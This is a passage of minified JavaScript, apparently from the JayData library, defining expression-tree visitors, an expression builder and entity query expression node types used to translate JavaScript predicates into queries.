return[memberAccess.expression,memberAccess.member];}},{});$data.Class.define('$data.Expressions.SetExecutableVisitor',$data.Expressions.ExpTreeVisitor,null,{Visit:function(eNode,context){switch(eNode.type){case LITERAL:return this.VisitLiteral(eNode,context);case VARIABLE:return this.VisitVariable(eNode,context);case MEMBERACCESS:return this.VisitMember(eNode,context);case BINARY:return this.VisitBinary(eNode,context);case UNARY:return this.VisitUnary(eNode,context);case INCDEC:return this.VisitIncDec(eNode,context);case EQUALITY:return this.VisitEquality(eNode,context);case DECISION:return this.VisitDecision(eNode,context);case METHODCALL:return this.VisitMethodCall(eNode,context);case NEW:return this.VisitNew(eNode,context);case JSONASSIGN:return this.VisitJsonAssign(eNode,context);case ARRAYACCESS:return this.VisitArrayAccess(eNode,context);default:Guard.raise("Type isn't implemented: "+eNode.type);}},VisitBinary:function(eNode,context){var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(left===eNode.left&&right===eNode.right&&(left.executable&&right.executable==eNode.executable))
return eNode;return $data.Expressions.ExpressionNodeTypes.BinaryExpressionNode.create(left.executable&&right.executable,eNode.operator,left,right);},VisitUnary:function(eNode,context){var operand=this.Visit(eNode.operand,context);if(operand===eNode.operand)
return eNode;return $data.Expressions.ExpressionNodeTypes.UnaryExpressionNode.create(operand.executable,eNode.operator,operand);},VisitIncDec:function(eNode,context){var operand=this.Visit(eNode.operand,context);if(operand===eNode.operand)
return eNode;return $data.Expressions.ExpressionNodeTypes.IncDecExpressionNode.create(operand.executable,eNode.operator,operand,eNode.suffix);},VisitEquality:function(eNode,context){var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(left===eNode.left&&right===eNode.right&&(left.executable&&right.executable==eNode.executable))
return eNode;return $data.Expressions.ExpressionNodeTypes.EqualityExpressionNode.create(left.executable&&right.executable,eNode.operator,left,right);},VisitDecision:function(eNode,context){var expression=this.Visit(eNode.expression,context);var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(expression===eNode.expression&&left===eNode.left&&right===eNode.right&&(left.executable&&right.executable&&expression.executable==eNode.executable))
return eNode;return $data.Expressions.ExpressionNodeTypes.DecisionExpressionNode.create(left.executable&&right.executable&&expression.executable,expression,left,right);},VisitMethodCall:function(eNode,context){var object=eNode.object?this.Visit(eNode.object,context):null;var args=this.VisitArray(eNode.args,context);if(object===eNode.object&&args===eNode.args&&((object==null?true:object.executable)==eNode.executable))
return eNode;return $data.Expressions.ExpressionNodeTypes.MethodcallExpressionNode.create(object==null?true:object.executable,object,eNode.method,args);},VisitNew:function(eNode,context){var values=this.VisitArray(eNode.values,context);if(values===eNode.values)
return eNode;return $data.Expressions.ExpressionNodeTypes.NewExpressionNode.create(true,values);},VisitJsonAssign:function(eNode,context){var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(left===eNode.left&&right===eNode.right)
return eNode;left.JSONASSIGN=true;right.JSONASSIGN=true;return $data.Expressions.ExpressionNodeTypes.JsonAssignExpressionNode.create(true,left,right);},VisitArrayAccess:function(eNode,context){var array=this.Visit(eNode.array,context);var index=this.Visit(eNode.index,context);if(array===eNode.array&&index===eNode.index)
return eNode;return $data.Expressions.ExpressionNodeTypes.ArrayAccessExpressionNode.create(true,array,index);},VisitArray:function(eNodes,context){var args=[];var ok=true;for(var i=0;i<eNodes.length;i++){args[i]=this.Visit(eNodes[i],context);ok=ok&&args[i]===eNodes[i];}
return ok?eNodes:args;},VisitLiteral:function(eNode,context){return{type:eNode.type,executable:true,value:eNode.value,valueType:eNode.valueType};},VisitVariable:function(eNode,context){if(typeof context.paramContext[eNode.name]==undefined)
Guard.raise("Variable is not defined in the paramContext: "+eNode.name);return $data.Expressions.ExpressionNodeTypes.VariableExpressionNode.create(true,"Math","GLOBALOBJECT");},VisitMember:function(eNode,context){var chain=this.GetMemberChain(eNode);var firstMember=chain[0].name;var isLambdaParam=context.lambdaParams.indexOf(firstMember)>=0;var isLocalParam=firstMember==context.paramsName;if(!isLocalParam&&!isLambdaParam)
Guard.raise("Variable is not defined in the paramContext or the lambda parameters: "+firstMember);return $data.Expressions.ExpressionNodeTypes.MemberAccessExpressionNode.create(isLocalParam,eNode.expression,eNode.member);}},null);$data.Class.define('$data.Expressions.ExecutorVisitor',$data.Expressions.ExpTreeVisitor,null,{VisitVariable:function(eNode,context){if(!eNode.executable)
return eNode;var value=(eNode.name==context.paramsName)?context.paramContext:window[eNode.name];if(typeof value=='undefined')
Guard.raise(new Exception("Unknown variable in '"+context.operation+"' operation. The variable isn't referenced in the parameter context and it's not a global variable: '"+eNode.name+"'.","InvalidOperation",{operationName:context.operation,missingParameterName:eNode.name}));return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,typeof value,value);},VisitMember:function(eNode,context){if(!eNode.executable)
return eNode;var chain=this.GetMemberChain(eNode);var value;for(var i=0;i<chain.length;i++){if(i==0)
value=context.paramContext;else
value=value[chain[i].name];}
return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,typeof value,value);},VisitUnary:function(eNode,context){var operand=this.Visit(eNode.operand,context);if(operand!==eNode.operand)
eNode=$data.Expressions.ExpressionNodeTypes.UnaryExpressionNode.create(eNode.executable,eNode.operator,operand);if(!eNode.executable)
return eNode;var value;var src;var operandValue=((operand.valueType=="string")?("'"+operand.value+"'"):operand.value);src="value = "+eNode.operator+" "+operandValue;eval(src);return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,typeof value,value);},VisitIncDec:function(eNode,context){var operand=this.Visit(eNode.operand,context);if(operand!==eNode.operand)
eNode=$data.Expressions.ExpressionNodeTypes.IncDecExpressionNode.create(eNode.executable,eNode.operator,operand,eNode.suffix);if(!eNode.executable)
return eNode;var value;if(eNode.suffix)
value=eNode.operator=="++"?operand.value++:operand.value--;else
value=eNode.operator=="++"?++operand.value:--operand.value;return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,typeof value,value);},VisitBinary:function(eNode,context){var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(left!==eNode.left||right!==eNode.right)
eNode=$data.Expressions.ExpressionNodeTypes.BinaryExpressionNode.create(eNode.executable,eNode.operator,left,right);if(!eNode.executable)
return eNode;var value;var src;var leftValue=((left.valueType=="string")?("'"+left.value+"'"):left.value);var rightValue=((right.valueType=="string")?("'"+right.value+"'"):right.value);src="value = "+leftValue+" "+eNode.operator+" "+rightValue;eval(src);return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,typeof value,value);},VisitEquality:function(eNode,context){var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(left!==eNode.left||right!==eNode.right)
eNode=$data.Expressions.ExpressionNodeTypes.EqualityExpressionNode.create(eNode.executable,eNode.operator,left,right);if(!eNode.executable)
return eNode;var value;var src;var leftValue=((left.valueType=="string")?("'"+left.value+"'"):left.value);var rightValue=((right.valueType=="string")?("'"+right.value+"'"):right.value);src="value = "+leftValue+" "+eNode.operator+" "+rightValue;eval(src);return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,typeof value,value);},VisitDecision:function(eNode,context){var expression=this.Visit(eNode.expression,context);var left=this.Visit(eNode.left,context);var right=this.Visit(eNode.right,context);if(expression!==eNode.expression||left!==eNode.left||right!==eNode.right)
eNode=$data.Expressions.ExpressionNodeTypes.DecisionExpressionNode.create(eNode.executable,expression,left,right);if(!eNode.executable)
return eNode;var value=expression.value?left.value:right.value;return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,typeof value,value);},VisitMethodCall:function(eNode,context){var object=eNode.object?this.Visit(eNode.object,context):null;var args=this.VisitArray(eNode.args,context);if(object!==eNode.object||args!=eNode.args)
eNode=$data.Expressions.ExpressionNodeTypes.MethodcallExpressionNode.create(eNode.executable,object,eNode.method,args);if(!eNode.executable)
return eNode;var a=[];for(var i=0;i<args.length;i++){var arg=args[i];var t=typeof arg.value;a.push((t=="string")?("'"+arg.value+"'"):arg.value);}
var value;var src=object?"value = object.value[eNode.method]("+a.join(",")+");":"value = "+eNode.method+"("+a.join(",")+");";eval(src);return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,typeof value,value);},VisitArrayAccess:function(eNode,context){var arrayNode=this.Visit(eNode.array,context);var indexNode=this.Visit(eNode.index,context);var value=arrayNode.value[indexNode.value];return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,typeof value,value);}},null);$data.Class.define('$data.Expressions.ExpressionBuilder',null,null,{constructor:function(context){this.context=context;},_isLambdaParam:function(name){var p=this.context.lambdaParams;for(var i=0;i<p.length;i++){if(p[i]==name)
return true;}
return false;},_isParam:function(name){return this.context.paramContext[name]!=undefined;},_isParamRoot:function(name){return this.context.paramsName==name;},Build:function(node,expNode){var n;switch(node.arity){case"infix":if("("==node.value)
n=this.BuildMethodCall(node,expNode);else if("."==node.value)
n=this.BuildMember(node,expNode);else if(["===","==","!==","!=",">","<",">=","<="].indexOf(node.value)>=0)
n=this.BuildEquality(node,expNode);else if(["&&","||"].indexOf(node.value)>=0)
n=this.BuildBinary(node,expNode);else if(["+","-","*","/","%"].indexOf(node.value)>=0)
n=this.BuildBinary(node,expNode);else if("["==node.value)
n=this.BuildArrayAccess(node,expNode);else
Guard.raise("Value of infix node isn't implemented: "+node.value);break;case"prefix":if(["+","-","!"].indexOf(node.value)>=0)
n=this.BuildUnary(node,expNode);else if(["++","--"].indexOf(node.value)>=0)
n=this.BuildIncDec(node,expNode);else if("{"==node.value)
n=this.BuildNewExpression(node,expNode);else
Guard.raise("Value of prefix node isn't implemented: "+node.value);break;case"suffix":if(["++","--"].indexOf(node.value)>=0)
n=this.BuildIncDec(node,expNode);else
Guard.raise("Value of suffix node isn't implemented: "+node.value);break;case"string":case"number":n=this.BuildLiteral(node,expNode);break;case"ternary":if(node.value=="?")
n=this.BuildDecision(node,expNode);else
Guard.raise("Value of ternary node isn't implemented: "+node.value);break;case null:case undefined:if(node.type=="boolean"&&(node.value=="true"||node.value=="false"))
n=this.BuildBoolLiteral(node,expNode);else
n=this.BuildVariable(node,expNode);break;default:Guard.raise("Arity isn't implemented: "+node.arity);}
return n;},BuildNewExpression:function(node,expNode){var newExpression=$data.Expressions.ExpressionNodeTypes.NewExpressionNode.create(true,[]);var n=node.first;for(var i=0;i<n.length;i++)
newExpression.values.push(this.Build(n[i],newExpression));return newExpression;},BuildLiteral:function(node,expNode){return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,node.arity,node.value);},BuildBoolLiteral:function(node,expNode){return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,node.type,node.value=="true"?true:false);},BuildVariable:function(node,expNode){if(!node.first){if(expNode.type==MEMBERACCESS){var subType;if(this._isLambdaParam(node.value))
subType="LAMBDAPARAM";else if(this._isParamRoot(node.value))
subType="PARAMETERROOT";else if(this._isParam(node.value))
subType="PARAMETER";else
subType="PROPERTY";}
else{if(this._isLambdaParam(node.value))
subType="LAMBDAPARAM";else if(this._isParamRoot(node.value))
subType="PARAMETERROOT";else if(this._isParam(node.value))
subType="PARAMETER";else if(window[node.value]!=undefined)
subType="GLOBALOBJECT";else
Guard.raise(new Exception("Unknown variable in '"+this.context.operation+"' operation. The variable isn't referenced in the parameter context and it's not a global variable: '"+node.value+"'.","InvalidOperation",{operationName:this.context.operation,missingParameterName:node.value}));}
return $data.Expressions.ExpressionNodeTypes.VariableExpressionNode.create(true,node.value,subType);}
var left=$data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,"name",node.value);var jsonAssign=$data.Expressions.ExpressionNodeTypes.JsonAssignExpressionNode.create(true);var right=this.Build(node.first,jsonAssign);jsonAssign.left=left;jsonAssign.right=right;left.JSONASSIGN=true;right.JSONASSIGN=true;return jsonAssign;},BuildMember:function(node,expNode){if(node.value!="."||node.arity!="infix"){if(node.type=="string"){return $data.Expressions.ExpressionNodeTypes.LiteralExpressionNode.create(true,node.arity,node.value);}
return $data.Expressions.ExpressionNodeTypes.MemberAccessExpressionNode.create(true,null,node.value);}
var result=$data.Expressions.ExpressionNodeTypes.MemberAccessExpressionNode.create(true);var expression=this.Build(node.first,result);var member=this.Build(node.second,result);result.expression=expression;result.member=member;return result;},BuildUnary:function(node,expNode){var result=$data.Expressions.ExpressionNodeTypes.UnaryExpressionNode.create(true,node.value);result.operand=this.Build(node.first,result);return result;},BuildIncDec:function(node,expNode){var result=$data.Expressions.ExpressionNodeTypes.IncDecExpressionNode.create(true,node.value,null,node.arity=="suffix");result.operand=this.Build(node.first,result);return result;},BuildBinary:function(node,expNode){if(!node.first)Guard.raise("Cannot build binary: node.first is null");if(!node.second)Guard.raise("Cannot build binary: node.second is null");var result=$data.Expressions.ExpressionNodeTypes.BinaryExpressionNode.create(true,node.value);result.left=this.Build(node.first,result);result.right=this.Build(node.second,result);return result;},BuildEquality:function(node,expNode){var result=$data.Expressions.ExpressionNodeTypes.EqualityExpressionNode.create(true,node.value);result.left=this.Build(node.first,result);result.right=this.Build(node.second,result);return result;},BuildDecision:function(node,expNode){var result=$data.Expressions.ExpressionNodeTypes.DecisionExpressionNode.create(true);result.expression=this.Build(node.first,result);result.left=this.Build(node.second,result);result.right=this.Build(node.third,result);return result;},BuildMethodCall:function(node,expNode){var result=$data.Expressions.ExpressionNodeTypes.MethodcallExpressionNode.create(true);if(node.first.type=="function"){result.object=this.Build(node.first.first,result);result.method=node.first.second.value;}
else{if(node.first.type!=null)
Guard.raise("Cannot build MethodCall because type is "+type);result.object=null;result.method=node.first.value;}
var argNodes=node.second;var args=[];for(var i=0;i<argNodes.length;i++){var arg=argNodes[i];args[i]=this.Build(arg,result);}
result.args=args;return result;},BuildArrayAccess:function(node,expNode){var result=$data.Expressions.ExpressionNodeTypes.ArrayAccessExpressionNode.create(true);result.array=this.Build(node.first,result);result.index=this.Build(node.second,result);return result;}},null);$C('$data.Expressions.AssociationInfoExpression',$data.Expressions.ExpressionNode,null,{constructor:function(associationInfo){this.associationInfo=associationInfo;},nodeType:{value:$data.Expressions.ExpressionType.AssociationInfo,enumerable:true}});$C('$data.Expressions.CodeExpression',$data.Expressions.ExpressionNode,null,{constructor:function(source,parameters){if(Container.resolveType(Container.getTypeName(source))==$data.String&&source.replace(/^[\s\xA0]+/,"").match("^function")!="function"){source="function (it) { return "+source+"; }";}
this.source=source;this.parameters=parameters;},nodeType:{value:$data.Expressions.ExpressionType.Code,enumerable:true}});$C('$data.Expressions.CodeToEntityConverter',$data.Expressions.ExpressionVisitor,null,{constructor:function(scopeContext){this.scopeContext=scopeContext;this.parameters=[];},VisitBinary:function(expression,context){var left=this.Visit(expression.left,context);var right=this.Visit(expression.right,context);var operatorResolution=this.scopeContext.resolveBinaryOperator(expression.nodeType,expression,context.frameType);var result=Container.createSimpleBinaryExpression(left,right,expression.nodeType,expression.operator,expression.type,operatorResolution);return result;},VisitUnary:function(expression,context){var operand=this.Visit(expression.operand,context);var operatorResolution=this.scopeContext.resolveUnaryOperator(expression.nodeType,expression,context.frameType);var result=Container.createUnaryExpression(operand,expression.operator,expression.nodeType,operatorResolution);return result;},VisitParameter:function(expression,context){Guard.requireValue("context",context);var et=$data.Expressions.ExpressionType;switch(expression.nodeType){case et.LambdaParameterReference:var result=Container.createEntityExpression(context.lambdaParameters[expression.paramIndex],{lambda:expression.name});return result;case et.LambdaParameter:break;default:Guard.raise("Global parameter "+expression.name+" not found. For query parameters use 'this.field' notation");break;}},VisitThis:function(expression,context){var index=this.parameters.push({name:"",value:undefined})-1;var result=Container.createQueryParameterExpression("",index,context.queryParameters,undefined);return result;},VisitFunction:function(expression,context){var result=$data.Expressions.ExpressionVisitor.prototype.VisitFunction.apply(this,arguments);return result.body;},VisitCall:function(expression,context){var self=this;var exp=this.Visit(expression.expression,context);var member=this.Visit(expression.member,context);var args=expression.args.map(function(arg){return self.Visit(arg,context);});var result;switch(true){case exp instanceof $data.Expressions.QueryParameterExpression:var argValues=args.map(function(a){return a.value;});result=expression.implementation(exp.value,member.value,argValues);return Container.createQueryParameterExpression(exp.name+"$"+member.value,exp.index,result,typeof result);case exp instanceof $data.Expressions.EntityFieldExpression:case exp instanceof $data.Expressions.EntityFieldOperationExpression:var operation=this.scopeContext.resolveFieldOperation(member.value,exp,context.frameType);if(!operation){Guard.raise("Unknown entity field operation: "+member.getJSON());}
member=Container.createMemberInfoExpression(operation);result=Container.createEntityFieldOperationExpression(exp,member,args);return result;case exp instanceof $data.Expressions.EntitySetExpression:var operation=this.scopeContext.resolveSetOperations(member.value,exp,context.frameType);if(!operation){Guard.raise("Unknown entity field operation: "+member.getJSON());}
member=Container.createMemberInfoExpression(operation);result=Container.createFrameOperationExpression(exp,member,args);return result;case exp instanceof $data.Expressions.EntityExpression:var operation=this.scopeContext.resolveTypeOperations(member.value,exp,context.frameType);if(!operation){Guard.raise("Unknown entity function operation: "+member.getJSON());}
member=Container.createMemberInfoExpression(operation);result=Container.createEntityFunctionOperationExpression(exp,member,args);return result;break;case exp instanceof $data.Expressions.EntityContextExpression:var operation=this.scopeContext.resolveContextOperations(member.value,exp,context.frameType);if(!operation){Guard.raise("Unknown entity function operation: "+member.getJSON());}
member=Container.createMemberInfoExpression(operation);result=Container.createContextFunctionOperationExpression(exp,member,args);return result;break;default:Guard.raise("VisitCall: Only fields can have operations: "+expression.getType().name);}},VisitProperty:function(expression,context){var exp=this.Visit(expression.expression,context);var member=this.Visit(expression.member,context);Guard.requireType("member",member,$data.Expressions.ConstantExpression);function isPrimitiveType(memberDefinitionArg){var t=memberDefinitionArg.dataType;if(typeof t==='function'){return false;}}
switch(exp.expressionType){case $data.Expressions.EntityExpression:var memberDefinition=exp.getMemberDefinition(member.value);if(!memberDefinition){Guard.raise(new Exception("Unknown member: "+member.value,"MemberNotFound"));}
var storageField=memberDefinition.storageModel.PhysicalType.memberDefinitions.getMember(memberDefinition.name);var res;var memberDefinitionExp;switch(storageField.kind){case"property":memberDefinitionExp=Container.createMemberInfoExpression(memberDefinition);res=Container.createEntityFieldExpression(exp,memberDefinitionExp);return res;case"navProperty":var assocInfo=memberDefinition.storageModel.Associations[memberDefinition.name];var setExpression=Container.createEntitySetExpression(exp,Container.createAssociationInfoExpression(assocInfo));if(assocInfo.ToMultiplicity!=="*"){var ee=Container.createEntityExpression(setExpression,{});return ee;}
return setExpression;case"complexProperty":memberDefinitionExp=Container.createMemberInfoExpression(memberDefinition);res=Container.createComplexTypeExpression(exp,memberDefinitionExp);return res;}
case $data.Expressions.ComplexTypeExpression:var memDef=exp.getMemberDefinition(member.value);if(!(memDef)){Guard.raise("Unknown member "+member.value+" on "+exp.entityType.name);}
var memDefExp=Container.createMemberInfoExpression(memDef);var result;if(Container.isPrimitiveType(Container.resolveType(memDef.dataType))){result=Container.createEntityFieldExpression(exp,memDefExp);return result;}
result=Container.createComplexTypeExpression(exp,memDefExp);return result;case $data.Expressions.QueryParameterExpression:var value=expression.implementation(exp.value,member.value);this.parameters[exp.index].name+="$"+member.value;this.parameters[exp.index].value=value;return Container.createQueryParameterExpression(exp.name+"$"+member.value,exp.index,value,Container.getTypeName(value));case $data.Expressions.EntityFieldExpression:case $data.Expressions.EntityFieldOperationExpression:var operation=this.scopeContext.resolveFieldOperation(member.value,exp,context.frameType);if(!operation){Guard.raise("Unknown entity field operation: "+member.getJSON());}
member=Container.createMemberInfoExpression(operation);result=Container.createEntityFieldOperationExpression(exp,member,[]);return result;default:Guard.raise("Unknown expression type to handle: "+exp.expressionType.name);}}});$C('$data.Expressions.ComplexTypeExpression',$data.Expressions.ExpressionNode,null,{constructor:function(source,selector){Guard.requireType("source",source,[$data.Expressions.EntityExpression,$data.Expressions.ComplexTypeExpression]);Guard.requireType("selector",selector,[$data.Expressions.EntityExpression,$data.Expressions.MemberInfoExpression]);this.source=source;this.selector=selector;var dt=source.entityType.getMemberDefinition(selector.memberName).dataType;var t=Container.resolveType(dt);this.entityType=t;},getMemberDefinition:function(name){return this.entityType.getMemberDefinition(name);},nodeType:{value:$data.Expressions.ExpressionType.Com}});$C('$data.Expressions.EntityContextExpression',$data.Expressions.ExpressionNode,null,{constructor:function(instance){this.instance=instance;},instance:{enumerable:false},nodeType:{value:$data.Expressions.ExpressionType.EntityContext,enumerable:true}});$C('$data.Expressions.EntityExpression',$data.Expressions.ExpressionNode,null,{constructor:function(source,selector){Guard.requireValue("source",source);Guard.requireValue("selector",selector);if(!(source instanceof $data.Expressions.EntitySetExpression)&&!(source instanceof $data.Expressions.ServiceOperationExpression)){Guard.raise("Only EntitySetExpressions can be the source for an EntityExpression");}
this.source=source;this.selector=selector;this.entityType=this.source.elementType;this.storageModel=this.source.storageModel;Guard.requireValue("entityType",this.entityType);Guard.requireValue("storageModel",this.storageModel);},getMemberDefinition:function(name){var memdef=this.entityType.getMemberDefinition(name);if(!(memdef)){Guard.raise(new Exception("Unknown member "+name+" on type "+this.entityType.name,"MemberNotFound"));};memdef.storageModel=this.storageModel;return memdef;},nodeType:{value:$data.Expressions.ExpressionType.Entity}});$C('$data.Expressions.EntityExpressionVisitor',null,null,{constructor:function(){this.lambdaTypes=[];},canVisit:function(expression){return expression instanceof $data.Expressions.ExpressionNode;},Visit:function(expression,context){if(!this.canVisit(expression))
return expression;var visitorName="Visit"+expression.getType().name;if(visitorName in this){var fn=this[visitorName];var result=fn.call(this,expression,context);if(typeof result==='undefined'){return expression;}
return result;}
return expression;},VisitToArrayExpression:function(expression,context){var source=this.Visit(expression.source,context);if(source!==expression.source){return Container.createToArrayExpression(source);}
return expression;},VisitForEachExpression:function(expression,context){var source=this.Visit(expression.source,context);if(source!==expression.source){return Container.createForEachExpression(source);}
return expression;},VisitMemberInfoExpression:function(expression,context){return expression;},VisitSingleExpression:function(expression,context){var source=this.Visit(expression.source,context);if(source!==expression.source)
return Container.createSingleExpression(source);return expression;},VisitFirstExpression:function(expression,context){var source=this.Visit(expression.source,context);if(source!==expression.source)
return Container.createFirstExpression(source);return expression;},VisitSomeExpression:function(expression,context){var source=this.Visit(expression.source,context);if(source!==expression.source)
return Container.createSomeExpression(source);return expression;},VisitEveryExpression:function(expression,context){var source=this.Visit(expression.source,context);if(source!==expression.source)
return Container.createEveryExpression(source);return expression;},VisitCountExpression:function(expression,context){var source=this.Visit(expression.source,context);if(source!==expression.source)
return Container.createCountExpression(source);return expression;},VisitBatchDeleteExpression:function(expression,context){var source=this.Visit(expression.source,context);if(source!==expression.source){return Container.createBatchDeleteExpression(source);}
return expression;},VisitObjectLiteralExpression:function(expression,context){var newValues=expression.members.map(function(ofe){return this.Visit(ofe,context);},this);var equal=true;for(var i=0;i<expression.members.length;i++){equal=equal&&(expression.members[i]===newValues[i]);}
if(!equal){return Container.createObjectLiteralExpression(newValues);}
return expression;},VisitObjectFieldExpression:function(expression,context){var newExpression=this.Visit(expression.expression,context);if(expression.expression!==newExpression){return Container.createObjectFieldExpression(expression.fieldName,newExpression);}
return expression;},VisitIncludeExpression:function(expression,context){var newExpression=this.Visit(expression.source,context);if(newExpression!==expression.source){return Container.createIncludeExpression(newExpression,expression.selector);}
return expression;},VisitUnaryExpression:function(expression,context){var operand=this.Visit(expression.operand,context);if(expression.operand!==operand){return Container.createUnaryExpression(operand,expression.operator,expression.nodeType,expression.resolution);};return expression;},VisitSimpleBinaryExpression:function(expression,context){var left=this.Visit(expression.left,context);var right=this.Visit(expression.right,context);if(left!==expression.left||right!==expression.right){return new $data.Expressions.SimpleBinaryExpression(left,right,expression.nodeType,expression.operator,expression.type,expression.resolution);}
return expression;},VisitEntityContextExpression:function(expression,context){return expression;},VisitCodeExpression:function(expression,context){return expression;},VisitComplexTypeExpression:function(expression,context){var source=this.Visit(expression.source,context);var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){var result=Container.createComplexTypeExpression(source,selector);return result;}
return expression;},VisitEntityExpression:function(expression,context){var source=this.Visit(expression.source,context);var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){var result=Container.createEntityExpression(source,selector);return result;}
return expression;},VisitEntityFieldExpression:function(expression,context){var source=this.Visit(expression.source,context);var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){var result=Container.createEntityFieldExpression(source,selector);return result;}
return expression;},VisitEntityFieldOperationExpression:function(expression,context){var source=this.Visit(expression.source,context);var operation=this.Visit(expression.operation,context);var parameters=expression.parameters.map(function(p){return this.Visit(p);},this);var result=Container.createEntityFieldOperationExpression(source,operation,parameters);return result;},VisitParametricQueryExpression:function(expression,context){var exp=this.Visit(expression.expression,context);var args=expression.parameters.map(function(p){return this.Visit(p);},this);var result=Container.createParametricQueryExpression(exp,args);return result;},VisitEntitySetExpression:function(expression,context){var source=this.Visit(expression.source,context);var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){return Container.createEntitySetExpression(source,selector,expression.params,expression.instance);}
return expression;},VisitInlineCountExpression:function(expression,context){var source=this.Visit(expression.source,context);var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){return Container.createInlineCountExpression(source,selector,expression.params,expression.instance);}
return expression;},VisitFilterExpression:function(expression,context){var source=this.Visit(expression.source,context);var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){return Container.createFilterExpression(source,selector,expression.params,expression.instance);}
return expression;},VisitProjectionExpression:function(expression,context){var source=this.Visit(expression.source,context);var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){var expr=Container.createProjectionExpression(source,selector,expression.params,expression.instance);expr.projectionAs=expression.projectionAs;return expr;}
return expression;},VisitOrderExpression:function(expression,context){var source=this.Visit(expression.source,context);var selector=this.Visit(expression.selector,context);if(source!==expression.source||selector!==expression.selector){return Container.createOrderExpression(source,selector,expression.nodeType);}
return expression;},VisitPagingExpression:function(expression,context){var source=this.Visit(expression.source,context);var amount=this.Visit(expression.amount,context);if(source!==expression.source||amount!==expression.amount){return Container.createPagingExpression(source,amount,expression.nodeType);}
return expression;}});$C('$data.Expressions.ExpressionMonitor',$data.Expressions.EntityExpressionVisitor,null,{constructor:function(monitorDefinition){this.Visit=function(expression,context){var result=expression;var methodName;if(this.canVisit(expression)){if(monitorDefinition.VisitExpressionNode){monitorDefinition.VisitExpressionNode.apply(monitorDefinition,arguments);};methodName="Visit"+expression.getType().name;if(methodName in monitorDefinition){result=monitorDefinition[methodName].apply(monitorDefinition,arguments);}}
var args=arguments;if(result!==expression)args=[result,context];result=$data.Expressions.EntityExpressionVisitor.prototype.Visit.apply(this,args);args=[result,context];if(this.canVisit(result)){var expressionTypeName=result.getType().name;if(monitorDefinition.MonitorExpressionNode){monitorDefinition.MonitorExpressionNode.apply(monitorDefinition,args);}
methodName="Monitor"+expressionTypeName;if(methodName in monitorDefinition){monitorDefinition[methodName].apply(monitorDefinition,args);}
if(monitorDefinition.MutateExpressionNode){monitorDefinition.MutateExpressionNode.apply(monitorDefinition,args);}
methodName="Mutate"+expressionTypeName;if(methodName in monitorDefinition){result=monitorDefinition[methodName].apply(monitorDefinition,args);}}
return result;};}});$C('$data.Expressions.EntityFieldExpression',$data.Expressions.ExpressionNode,null,{constructor:function(source,selector){this.selector=selector;this.source=source;if(this.selector instanceof $data.Expressions.MemberInfoExpression||this.selector.name){this.memberName=this.selector.name;}},nodeType:{value:$data.Expressions.ExpressionType.EntityField}});$C('$data.Expressions.EntityFieldOperationExpression',$data.Expressions.ExpressionNode,null,{constructor:function(source,operation,parameters){this.source=source;this.operation=operation;this.parameters=parameters;},nodeType:{value:$data.Expressions.ExpressionType.EntityFieldOperation}});$C('$data.Expressions.EntitySetExpression',$data.Expressions.ExpressionNode,null,{constructor:function(source,selector,params,instance){Guard.requireType("source",source,[$data.Expressions.EntityContextExpression,$data.Expressions.EntitySetExpression]);Guard.requireType("selector",source,[$data.Expressions.MemberInfoExpression,$data.Expressions.CodeExpression,$data.Expressions.ParametricQueryExpression]);this.source=source;this.selector=selector;this.params=params;this.instance=instance;function findContext(){var r=source;while(r){if(r instanceof $data.Expressions.EntityContextExpression){return r;}
r=r.source;}}
this.storage_type={};var c=findContext();switch(true){case this.source instanceof $data.Expressions.EntityContextExpression:Guard.requireType("selector",selector,$data.Expressions.MemberInfoExpression);this.elementType=selector.memberDefinition.elementType;this.storageModel=c.instance._storageModel.getStorageModel(this.elementType);break;case this.source instanceof $data.Expressions.EntityExpression:Guard.requireType("selector",selector,$data.Expressions.AssociationInfoExpression);this.elementType=selector.associationInfo.ToType;this.storageModel=c.instance._storageModel.getStorageModel(this.elementType);break;case this.source instanceof $data.Expressions.EntitySetExpression:this.elementType=this.source.elementType;this.storageModel=this.source.storageModel;break;case this.source instanceof $data.Expressions.ServiceOperationExpression:this.elementType=this.source.elementType;this.storageModel=this.source.storageModel;break;default:Guard.raise("take and skip must be the last expressions in the 